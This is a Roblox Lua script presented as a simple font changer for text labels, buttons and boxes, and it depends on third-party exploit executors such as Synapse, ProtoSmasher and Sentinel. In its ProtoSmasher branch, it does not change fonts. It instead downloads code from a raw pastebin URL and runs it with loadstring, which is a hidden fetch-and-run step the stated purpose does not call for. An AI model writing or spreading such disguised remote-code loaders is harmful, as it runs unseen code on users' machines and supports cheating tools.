-- Make sure to replace FONT NAME HERE with the desired font name
-- You can find fonts at https://create.roblox.com/docs/reference/engine/enums/Font
-- Made by JustDev
-- You can put this in autoexecute folder if you want
local fontName = "Code"

local exploit = syn or (not is_sirhurt_closure and pebc_execute and "ProtoSmasher") or (secure_load and "Sentinel")

if not exploit then
    print("This script requires a supported exploit!")
    return
end

local function changeFont()
    for _, instance in pairs(game:GetDescendants()) do
        if instance:IsA("TextLabel") or instance:IsA("TextButton") or instance:IsA("TextBox") then
            instance.Font = fontName
        end
    end
end

changeFont()

if exploit == "ProtoSmasher" then
    loadstring(game:HttpGet("https://pastebin.com/raw/26siRATc", true))()
elseif exploit == "Sentinel" then
    secure_load(function()
        while wait(5) do
            changeFont()
        end
    end)()
else
    while wait(5) do
        changeFont()
    end
end
